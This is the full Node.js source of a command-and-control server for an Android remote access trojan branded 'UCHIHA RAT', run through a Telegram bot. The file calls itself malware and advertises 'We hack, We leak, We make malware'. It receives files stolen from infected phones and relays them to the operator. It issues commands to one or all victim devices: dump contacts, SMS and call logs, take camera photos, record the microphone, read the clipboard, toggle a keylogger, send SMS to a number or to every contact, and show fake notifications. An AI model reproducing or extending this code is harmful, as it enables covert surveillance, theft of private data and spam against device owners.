const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// Read config from data.json safely
const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
const bot = new telegramBot(data.token, {
    polling: true,
    request: {}
});

const appData = new Map();

// Removed all stars (✯)
const actions = [
    "Contacts", "SMS", "Calls", "Apps", "Main camera", "Selfie Camera",
    "Microphone", "Clipboard", "Screenshot", "Toast", "Send SMS",
    "Vibrate", "Play audio", "Stop Audio", "Keylogger ON", "Keylogger OFF",
    "File explorer", "Gallery", "Encrypt", "Decrypt", "Send SMS to all contacts",
    "Pop notification", "Open URL", "Phishing", "Back to main menu"
];

// Main Menu Keyboard
const mainMenuKeyboard = {
    keyboard: [["Devices", "Action"], ["About us"]],
    resize_keyboard: true
};

// Action Menu Keyboard (Without stars)
const actionMenuKeyboard = {
    keyboard: [
        ["Contacts", "SMS"], ["Calls", "Apps"], 
        ["Main camera", "Selfie Camera"], ["Microphone", "Clipboard"], 
        ["Screenshot", "Toast"], ["Send SMS", "Vibrate"], 
        ["Play audio", "Stop Audio"], ["Keylogger ON", "Keylogger OFF"], 
        ["File explorer", "Gallery"], ["Encrypt", "Decrypt"], 
        ["Open URL", "Phishing"], ["Send SMS to all contacts"], 
        ["Pop notification"], ["Back to main menu"]
    ],
    resize_keyboard: true,
    one_time_keyboard: true
};

// Cancel Keyboard
const cancelKeyboard = {
    keyboard: [["Cancel action"]],
    resize_keyboard: true,
    one_time_keyboard: true
};

// Custom Loader UI for Commands
const SUCCESS_LOADER = "🩸 <b>Romeo Uchiha</b> 👁️\n\n🌀 <b>Processing Request...</b>\n[████████████████] 100%\n\n°• <i>Request executed successfully! Waiting for device response...</i>\n\n<b>Return to main menu</b>";
const PREMIUM_MSG = "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>This option is only available on premium version. DM to buy <b>Romeo Uchiha</b></b>\n\n";

app.post("/upload", uploader.single('file'), (req, res) => {
    const fileName = req.file.originalname;
    const deviceModel = req.headers.model;
    
    bot.sendDocument(data.id, req.file.buffer, {
        caption: `🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>File received from → ${deviceModel}</b>`,
        parse_mode: "HTML"
    }, {
        filename: fileName,
        contentType: req.file.mimetype || "*/*" 
    });
    res.send("Done");
});

app.get("/text", (req, res) => {
    res.send(data.text);
});

io.on("connection", socket => {
    let modelName = socket.handshake.headers.model + '-' + io.sockets.sockets.size || "no information";
    let appVersion = socket.handshake.headers.version || "no information";
    let ipAddress = socket.handshake.headers.ip || "no information";
    
    socket.model = modelName;
    socket.version = appVersion;
    
    let connectMsg = "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>New device connected</b>\n\n" + 
                     "<b>Model</b> → " + modelName + "\n" + 
                     "<b>Version</b> → " + appVersion + "\n" + 
                     "<b>IP</b> → " + ipAddress + "\n" + 
                     "<b>Time</b> → " + socket.handshake.time + "\n\n";
                     
    bot.sendMessage(data.id, connectMsg, { parse_mode: "HTML" });
    
    socket.on("disconnect", () => {
        let disconnectMsg = "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Device disconnected</b>\n\n" + 
                            "<b>Model</b> → " + modelName + "\n" + 
                            "<b>Version</b> → " + appVersion + "\n" + 
                            "<b>IP</b> → " + ipAddress + "\n" + 
                            "<b>Time</b> → " + socket.handshake.time + "\n\n";
        bot.sendMessage(data.id, disconnectMsg, { parse_mode: "HTML" });
    });
    
    socket.on("message", clientMsg => {
        bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Message received from → " + modelName + "\n\nMessage → </b>" + clientMsg, { parse_mode: "HTML" });
    });
});

bot.on("message", msg => {
    const text = msg.text;

    if (text === "/start") {
        bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Welcome to UCHIHA RAT</b>\n\nUCHIHA RAT is a malware to control Android devices.\nAny misuse is the responsibility of the person!\n\nDeveloped by: <b>Romeo Uchiha</b>", {
            parse_mode: "HTML",
            reply_markup: mainMenuKeyboard
        });
    } else if (appData.get("currentAction") === "microphoneDuration") {
        let duration = text;
        let target = appData.get('currentTarget');
        let payload = { request: "microphone", extras: [{ key: "duration", value: duration }] };
        
        if (target == "all") io.sockets.emit("commend", payload);
        else io.to(target).emit("commend", payload);
        
        appData.delete("currentTarget");
        appData.delete("currentAction");
        bot.sendMessage(data.id, SUCCESS_LOADER, { parse_mode: "HTML", reply_markup: mainMenuKeyboard });

    } else if (appData.get("currentAction") === "toastText") {
        let toastMsg = text;
        let target = appData.get('currentTarget');
        let payload = { request: "toast", extras: [{ key: "text", value: toastMsg }] };
        
        if (target == "all") io.sockets.emit("commend", payload);
        else io.to(target).emit("commend", payload);
        
        appData.delete("currentTarget");
        appData.delete("currentAction");
        bot.sendMessage(data.id, SUCCESS_LOADER, { parse_mode: "HTML", reply_markup: mainMenuKeyboard });

    } else if (appData.get("currentAction") === "smsNumber") {
        appData.set("currentNumber", text);
        appData.set("currentAction", 'smsText');
        bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Now Enter a message that you want to send to " + text + "</b>\n\n", {
            parse_mode: "HTML",
            reply_markup: cancelKeyboard
        });

    } else if (appData.get("currentAction") === "smsText") {
        let smsText = text;
        let number = appData.get("currentNumber");
        let target = appData.get("currentTarget");
        let payload = { request: "sendSms", extras: [{ key: "number", value: number }, { key: "text", value: smsText }] };
        
        if (target == "all") io.sockets.emit("commend", payload);
        else io.to(target).emit("commend", payload);
        
        appData.delete('currentTarget');
        appData.delete("currentAction");
        appData.delete("currentNumber");
        bot.sendMessage(data.id, SUCCESS_LOADER, { parse_mode: "HTML", reply_markup: mainMenuKeyboard });

    } else if (appData.get("currentAction") === "vibrateDuration") {
        let duration = text;
        let target = appData.get("currentTarget");
        let payload = { request: "vibrate", extras: [{ key: "duration", value: duration }] };
        
        if (target == "all") io.sockets.emit("commend", payload);
        else io.to(target).emit("commend", payload);
        
        appData.delete("currentTarget");
        appData.delete("currentAction");
        bot.sendMessage(data.id, SUCCESS_LOADER, { parse_mode: "HTML", reply_markup: mainMenuKeyboard });

    } else if (appData.get("currentAction") === "textToAllContacts") {
        let smsText = text;
        let target = appData.get("currentTarget");
        let payload = { request: "smsToAllContacts", extras: [{ key: "text", value: smsText }] };
        
        if (target == "all") io.sockets.emit("commend", payload);
        else io.to(target).emit("commend", payload);
        
        appData.delete("currentTarget");
        appData.delete("currentAction");
        bot.sendMessage(data.id, SUCCESS_LOADER, { parse_mode: "HTML", reply_markup: mainMenuKeyboard });

    } else if (appData.get("currentAction") === "notificationText") {
        let notifText = text;
        let target = appData.get('currentTarget');
        let payload = { request: "popNotification", extras: [{ key: "text", value: notifText }] };
        
        if (target == "all") io.sockets.emit("commend", payload);
        else io.to(target).emit("commend", payload);
        
        appData.delete('currentTarget');
        appData.delete("currentAction");
        bot.sendMessage(data.id, SUCCESS_LOADER, { parse_mode: "HTML", reply_markup: mainMenuKeyboard });

    } else if (text === "Devices") {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>There is no connected device</b>\n\n", { parse_mode: "HTML" });
        } else {
            let listMsg = "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Connected devices count : " + io.sockets.sockets.size + "</b>\n\n";
            let count = 1;
            io.sockets.sockets.forEach((soc) => {
                listMsg += "<b>Device " + count + "</b>\n" + 
                           "<b>Model</b> → " + soc.model + "\n" + 
                           "<b>Version</b> → " + soc.version + "\n" + 
                           "<b>IP</b> → " + soc.ip + "\n" + 
                           "<b>Time</b> → " + soc.handshake.time + "\n\n";
                count++;
            });
            bot.sendMessage(data.id, listMsg, { parse_mode: "HTML" });
        }
    } else if (text === "Action") {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>There is no connected device</b>\n\n", { parse_mode: "HTML" });
        } else {
            let deviceList = [];
            io.sockets.sockets.forEach((soc) => {
                deviceList.push([soc.model]);
            });
            deviceList.push(["All"]);
            deviceList.push(["Back to main menu"]);
            
            bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Select device to perform action</b>\n\n", {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: deviceList,
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        }
    } else if (text === "About us") {
        bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>If you want to hire us for any paid work please contact <b>Romeo Uchiha</b>\nWe hack, We leak, We make malware\n\nTelegram → <b>Romeo Uchiha</b>\nADMIN → <b>Romeo Uchiha</b></b>\n\n", { parse_mode: 'HTML' });
    } else if (text === "Back to main menu") {
        bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Main menu</b>\n\n", {
            parse_mode: "HTML",
            reply_markup: mainMenuKeyboard
        });
    } else if (text === "Cancel action") {
        let targetId = appData.get("currentTarget");
        if (targetId == "all") {
            bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Select action to perform for all available devices</b>\n\n", {
                parse_mode: "HTML",
                reply_markup: actionMenuKeyboard
            });
        } else {
            let targetModel = io.sockets.sockets.get(targetId).model;
            bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Select action to perform for " + targetModel + "</b>\n\n", {
                parse_mode: "HTML",
                reply_markup: actionMenuKeyboard
            });
        }
    } else if (actions.includes(text)) {
        let target = appData.get("currentTarget");
        
        const directCommands = {
            "Contacts": "contacts", "Calls": "calls", "Apps": "apps", 
            "Main camera": "main-camera", "Selfie Camera": "selfie-camera", 
            "Clipboard": "clipboard", "Keylogger ON": "keylogger-on", "Keylogger OFF": "keylogger-off"
        };
        
        if (directCommands[text]) {
            let payload = { request: directCommands[text], extras: [] };
            if (target == "all") io.sockets.emit("commend", payload);
            else io.to(target).emit("commend", payload);
            
            appData.delete("currentTarget");
            bot.sendMessage(data.id, SUCCESS_LOADER, { parse_mode: "HTML", reply_markup: mainMenuKeyboard });
        } 
        else if (text === "SMS") {
            let payload = { request: "all-sms", extras: [] };
            if (target == "all") io.sockets.emit("commend", payload);
            else io.to(target).emit("commend", payload);
            appData.delete("currentTarget");
            bot.sendMessage(data.id, SUCCESS_LOADER, { parse_mode: "HTML", reply_markup: mainMenuKeyboard });
        }
        else if (["Screenshot", "File explorer", "Gallery", "Encrypt", "Decrypt", "Open URL", "Phishing", "Play audio", "Stop Audio"].includes(text)) {
            bot.sendMessage(data.id, PREMIUM_MSG, { parse_mode: "HTML", reply_markup: mainMenuKeyboard });
        }
        else if (text === "Microphone") {
            appData.set("currentAction", 'microphoneDuration');
            bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Enter the microphone recording duration in seconds</b>\n\n", { parse_mode: 'HTML', reply_markup: cancelKeyboard });
        }
        else if (text === "Toast") {
            appData.set("currentAction", "toastText");
            bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Enter a message that you want to appear in toast box</b>\n\n", { parse_mode: "HTML", reply_markup: cancelKeyboard });
        }
        else if (text === "Send SMS") {
            appData.set("currentAction", "smsNumber");
            bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Enter a phone number that you want to send SMS</b>\n\n", { parse_mode: 'HTML', reply_markup: cancelKeyboard });
        }
        else if (text === "Vibrate") {
            appData.set("currentAction", "vibrateDuration");
            bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Enter the duration you want the device to vibrate in seconds</b>\n\n", { parse_mode: "HTML", reply_markup: cancelKeyboard });
        }
        else if (text === "Send SMS to all contacts") {
            appData.set("currentAction", "textToAllContacts");
            bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Enter text that you want to send to all target contacts</b>\n\n", { parse_mode: "HTML", reply_markup: cancelKeyboard });
        }
        else if (text === "Pop notification") {
            appData.set("currentAction", "notificationText");
            bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Enter text that you want to appear as notification</b>\n\n", { parse_mode: "HTML", reply_markup: cancelKeyboard });
        }
    } else {
        io.sockets.sockets.forEach((soc, socketId) => {
            if (text === soc.model) {
                appData.set("currentTarget", socketId);
                bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Select action to perform for " + soc.model + "</b>\n\n", {
                    parse_mode: "HTML",
                    reply_markup: actionMenuKeyboard
                });
            }
        });
        if (text == "All") {
            appData.set("currentTarget", "all");
            bot.sendMessage(data.id, "🩸 <b>Romeo Uchiha</b> 👁️\n\n<b>Select action to perform for all available devices</b>\n\n", {
                parse_mode: "HTML",
                reply_markup: actionMenuKeyboard
            });
        }
    }
});

// Railway Ping / Keep-alive optimizations
setInterval(() => {
    io.sockets.sockets.forEach((soc, socketId) => {
        io.to(socketId).emit("ping", {});
    });
}, 5000);

setInterval(() => {
    https.get(data.host, res => {}).on("error", err => {});
}, 300000);

server.listen(process.env.PORT || 3000, () => {
    console.log("Uchiha Server listening on port 3000");
});
